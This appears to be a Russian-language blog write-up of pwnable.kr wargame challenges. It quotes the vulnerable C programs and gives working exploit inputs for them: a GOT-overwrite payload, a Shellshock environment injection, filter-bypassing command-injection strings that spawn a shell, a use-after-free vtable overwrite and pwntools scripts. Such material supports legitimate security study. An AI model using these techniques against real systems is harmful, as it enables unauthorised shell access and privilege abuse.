passcode1 и passcode2 инты, каждый занимает 4 байта Считаем оффсет, passcode1 - name = 0x70 - 0x10 = 0x60 = 96 байт passcode1 занимает последние 4 байта массива name Заполняем массив до конца В последних 4-ёх байтах передаём адрес функции fflush из GOT - 0x0804a004 scanf’ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147) При вызове fflush исполнение перейдёт на нужную нам часть листинга gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x08048436 gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x080485e3 python -c &quot;print &#39;\\x01&#39;*96 + &#39;\\x04\\xa0\\x04\\x08&#39; + &#39;134514147&#39;&quot; | ./passcode Sorry mom… I got confused about scanf usage :( random Daddy, teach me how to use random value in programming! ssh random@pwnable.kr -p2222 (pw:guest) random.c #include &lt;stdio.h&gt; int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;); return 0; } Не инициализирован сид для рандома (srand) Первое значение рандома в си без инициализации - 0x6b8b4567 key ^ 0x6b8b4567 == 0xdeadbeef –&gt; 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039230856 Передаём в прогу это число 3039230856 random@pwnable:~$ echo -ne &quot;3039230856&quot; | ./random Good! Mommy, I thought libc random is unpredictable… input Mom? how can I pass my input to a computer program? ssh input2@pwnable.kr -p2222 (pw:guest) input.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; int main(int argc, char* argv[], char* envp[]){ printf(&quot;Welcome to pwnable.kr\\n&quot;); printf(&quot;Let&#39;s see if you know how to give input to program\\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv[&#39;A&#39;],&quot;\\x00&quot;)) return 0; if(strcmp(argv[&#39;B&#39;],&quot;\\x20\\x0a\\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\\n&quot;); // env if(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\\n&quot;); // file FILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[&#39;C&#39;]) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\\n&quot;); // here&#39;s your flag system(&quot;/bin/cat flag&quot;); return 0; } python2 import subprocess import os import socket import time os.system(&quot;ln -s /home/input2/flag /tmp/tests4/flag&quot;) with open(&quot;/tmp/tests4/\\x0a&quot;, &quot;w&quot;) as f: f.write(&quot;\\x00\\x00\\x00\\x00&quot;) stdin_r, stdin_w = os.pipe() stderr_r, stderr_w = os.pipe() args = [&#39;X&#39;] * 99 args[64] = &#39;&#39; args[65] = &quot;\\x20\\x0A\\x0D&quot; args[66] = &quot;65005&quot; process = subprocess.Popen([&quot;/home/input2/input&quot;] + args, stdin=stdin_r, stderr=stderr_r, env={&quot;\\xDE\\xAD\\xBE\\xEF&quot;: &quot;\\xCA\\xFE\\xBA\\xBE&quot;}, cwd=&quot;/tmp/tests4/&quot;) os.write(stdin_w, &quot;\\x00\\x0A\\x00\\xFF&quot;) os.write(stderr_w, &quot;\\x00\\x0A\\x02\\xFF&quot;) time.sleep(3) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&quot;localhost&quot;, 65005)) s.sendall(&#39;\\xDE\\xAD\\xBE\\xEF&#39;) s.close() Mommy! I learned how to pass various input in Linux :) stroobants.dev/pwnablekr-series-input.html leg Daddy told me I should study arm. But I prefer to study my leg! Download: http://pwnable.kr/bin/leg.c Download: http://pwnable.kr/bin/leg.asm ssh leg@pwnable.kr -p2222 (pw:guest) leg.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; int key1(){ asm(&quot;mov r3, pc\\n&quot;); } int key2(){ asm( &quot;push {r6}\\n&quot; &quot;add r6, pc, $1\\n&quot; &quot;bx r6\\n&quot; &quot;.code 16\\n&quot; &quot;mov r3, pc\\n&quot; &quot;add r3, $0x4\\n&quot; &quot;push {r3}\\n&quot; &quot;pop {pc}\\n&quot; &quot;.code 32\\n&quot; &quot;pop {r6}\\n&quot; ); } int key3(){ asm(&quot;mov r3, lr\\n&quot;); } int main(){ int key=0; printf(&quot;Daddy has very strong arm! : &quot;); scanf(&quot;%d&quot;, &amp;key); if( (key1()+key2()+key3()) == key ){ printf(&quot;Congratz!\\n&quot;); int fd = open(&quot;flag&quot;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(&quot;I have strong leg :P\\n&quot;); } return 0; } leg.asm (gdb) disass main Dump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push {r4, r11, lr} 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop {r4, r11, pc} 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9 End of assembler dump. (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lr End of assembler dump. (gdb) hex(0x8ce4 + 0x8d0c + 0x8d80) &gt; Out[33]: &#39;0x1a770&#39; / $ ./leg Daddy has very strong arm! : 108400 Congratz! My daddy has a lot of ARMv5te muscle! mistake We all make mistakes, let’s move on. don’t take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) mistake.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can&#39;t open password %d\\n&quot;, fd); return 0; } printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(&quot;read error\\n&quot;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); } else{ printf(&quot;Wrong Password\\n&quot;); } close(fd); return 0; } В fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0 сначала выполняется правая часть, а в самом конце = (fd = (1 &lt; 0)) --&gt; false Поэтому по итогу в fd, из которого по идее мы читаем(где должен быть дескриптор файла password), лежит 0, читаем из stdin’а mistake@pwnable:~$ ./mistake do not bruteforce… @@@@@CCCCC input password : AAAAABBBBB Password OK Mommy, the operator priority always confuses me :( shellshock Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :) ssh shellshock@pwnable.kr -p2222 (pw:guest) shellshock.c #include &lt;stdio.h&gt; int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;); return 0; } env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock only if I knew CVE-2014-6271 ten years ago…!! coin1 Mommy, I wanna play a game! (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server) Running at : nc pwnable.kr 9007 --------------------------------------------------- - Shall we play a game? - --------------------------------------------------- You have given some gold coins in your hand however, there is one counterfeit coin among them counterfeit coin looks exactly same as real coin however, its weight is different from real one real coin weighs 10, counterfeit coin weighes 9 help me to find the counterfeit coin with a scale if you find 100 counterfeit coins, you will get reward :) FYI, you have 60 seconds. - How to play - 1. you get a number of coins (N) and number of chances (C) 2. then you specify a set of index numbers of coins to be weighed 3. you get the weight information 4. 2~3 repeats C time, then you give the answer - Example - [Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial [Client] 0 1 # weigh first and second coin [Server] 20 # scale result : 20 [Client] 3 # weigh fourth coin [Server] 10 # scale result : 10 [Client] 2 # counterfeit coin is third! [Server] Correct! - Ready? starting in 3 sec... - Бинарная сиртировка тупа Ну чё, посортируем from pwn import * # For SSHing in, and then running locally # s = ssh(host=&quot;pwnable.kr&quot;, user=&quot;fd&quot;, port=2222, password=&quot;guest&quot;) # conn = s.remote(&#39;localhost&#39;, 9007) # For running remotely #conn = remote(&#39;pwnable.kr&#39;, 9007) # For running locally on pwnable.kr # Всё оч медленно, поэтому, кроме как подконнектиться и запустить локально, вариков нет conn = remote(&#39;localhost&#39;, 9007) conn.recvuntil(&#39;Ready? starting in 3 sec&#39;) conn.recvline() conn.recvline() for _ in range(100): line = conn.recvline().decode(&#39;utf-8&#39;).strip().split(&#39; &#39;) # [u&#39;N=317&#39;, u&#39;C=9&#39;] # print line n = int(line[0].split(&#39;=&#39;)[1]) # 317 c = int(line[1].split(&#39;=&#39;)[1]) # 9 start = 0 end = n - 1 for _ in range(c): mid = int((start + end)/2) # cast to ensure only whole numbers # print(&#39;start: &#39;+str(start)) # print(&#39;mid: &#39;+str(mid)) # print(&#39;end: &#39;+str(end)) guess = &#39; &#39;.join(str(i) for i in range(start, mid + 1)) # print guess conn.sendline(guess) weight = int(conn.recvline()) # print weight if weight % 10 == 0: # if divisible by 10, then no counterfeit in list start = mid + 1 else: # counterfeit in list end = mid conn.sendline(str(start)) # send final guess print(conn.recvline()) # Correct! (n) print(conn.recvline()) # Congrats! get your flag print(conn.recvline()) # {actual flag} conn.close() b1NaRy_S34rch1nG_1s_3asy_p3asy код отсюда blackjack Hey! check out this C implementation of blackjack game! I found it online http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html I like to give my flags to millionares. how much money you got? Running at : nc pwnable.kr 9009 Видим код и реализацию betting int betting() //Asks user amount to bet { printf(&quot;\\n\\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(&quot;\\nYou cannot bet more money than you have.&quot;); printf(&quot;\\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; } else return bet; Всего лишь два прохода, на втором нет проверки bet &gt; cash 2 варианта: 1) Ввести сначала чисто больше 500 –&gt; попадаем в if 2) Вводим число очень большое 2147483047 3) Выигрываем в партии –&gt; профит 1) Вводим отрицательное число –&gt; - - = + 2) Проигрываем YaY_I_AM_A_MILLIONARE_LOL lotto Mommy! I made a lotto program for my homework. do you want to play? ssh lotto@pwnable.kr -p2222 (pw:guest) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; unsigned char submit[6]; void play(){ int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1){ printf(&quot;error. tell admin\\n&quot;); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(&quot;error2. tell admin\\n&quot;); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;bad luck...\\n&quot;); } } void help(){ printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; } } return 0; } Проверяется один байт рандома с 6-ью байтами инпута, занчит все байты инпута должны быть одинаковыми, пишем скрипт и надеемся на рандом! Диапазон от 1 до 45 from pwn import * sh = ssh(&#39;lotto&#39;, &#39;pwnable.kr&#39;, password=&#39;guest&#39;, port=2222) p = sh.process(&#39;./lotto&#39;) for i in range(1000): p.recv() p.sendline(&#39;1&#39;) p.recv() p.sendline(&#39;------&#39;) _ , ans = p.recvlines(2) if &quot;bad&quot; not in ans: print(ans) break sorry mom… I FORGOT to check duplicate numbers… :( cmd1 Mommy! what is PATH environment in Linux? ssh cmd1@pwnable.kr -p2222 (pw:guest) cmd1.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(&quot;PATH=/thankyouverymuch&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } Notice the difference between single quotes and double quotes in argv: $ ./test &#39;$(echo abc)&#39; argv[1] = $(echo abc) $ ./test &quot;$(echo abc)&quot; argv[1] = abc Single quotes pass the command without executing it. Double quotes executes the command then passes its output (cannot pass the filter). ./cmd1 &#39;$(printf &quot;/bin/%s%s&quot; &quot;s&quot; &quot;h&quot;)&#39; /bin/cat /home/cmd1/flag mommy now I get what PATH environment is for :) cmd2 Daddy bought me a system command shell. but he put some filters to prevent me from playing with it without his permission… but I wanna play anytime I want! ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1) #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0; } ./cmd2 &#39;$(printf &quot;%bbin%bbash -p&quot; &quot;\\57&quot; &quot;\\57&quot;)&#39; (и гениальное) ./cmd2 &#39;$(read x; echo $x)&#39; FuN_w1th_5h3ll_v4riabl3s_haha uaf Mommy, what is Use After Free bug? ssh uaf@pwnable.kr -p2222 (pw:guest) #include &lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); } protected: int age; string name; public: virtual void introduce(){ cout &lt; &quot;My name is &quot; &lt; name &lt; endl; cout &lt; &quot;I am &quot; &lt; age &lt; &quot; years old&quot; &lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a nice guy!&quot; &lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a cute girl!&quot; &lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt; &quot;your data is allocated&quot; &lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } python -c &#39;print (&quot;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#39; &gt; /tmp/ihcuaf ./uaf 24 /tmp/ihcuaf 3 2 2 1 cat flag yay_f1ag_aft3r_pwning https://gist.github.com/ihciah/3c157f18f49bd2287470 https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472 memcpy asm unlink blukat horcruxes","headline":"pwnable.kr [ru]","image":"/assets/previews/12.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/09/28/pwnablekr.html"},"url":"/2022/09/28/pwnablekr.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h1 id="fd"><a href="#header-1"></a>fd</h1>

<blockquote>
  <p>Mommy! what is a file descriptor in Linux?</p>

  <p>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</p>

  <p>https://youtu.be/971eZhMHQQw</p>

  <p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>fd.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
  <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"pass argv[1] a number</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"LETMEWIN</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"good job :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"learn about Linux file IO</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<p>Хотим получить stdin –&gt; всё просто: 0x1234 - X = 0 –&gt; x = 4660</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./fd 4660
LETMEWIN

<span class="o">&gt;</span> good job :<span class="o">)</span>
<span class="o">&gt;</span> mommy! I think I know what a file descriptor is!!
</code></pre></div></div>

<h1 id="collision"><a href="#header-1"></a>collision</h1>

<blockquote>
  <p>Daddy told me about cool MD5 hash collision today.</p>

  <p>I wanna do something like that too!</p>

  <p>ssh col@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>col.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hashcode</span> <span class="o">=</span> <span class="mh">0x21DD09EC</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">check_password</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">p</span><span class="p">){</span>
  <span class="kt">int</span><span class="o">*</span> <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">res</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">ip</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
  <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"usage : %s [passcode]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">20</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"passcode length should be 20 bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="n">hashcode</span> <span class="o">==</span> <span class="n">check_password</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
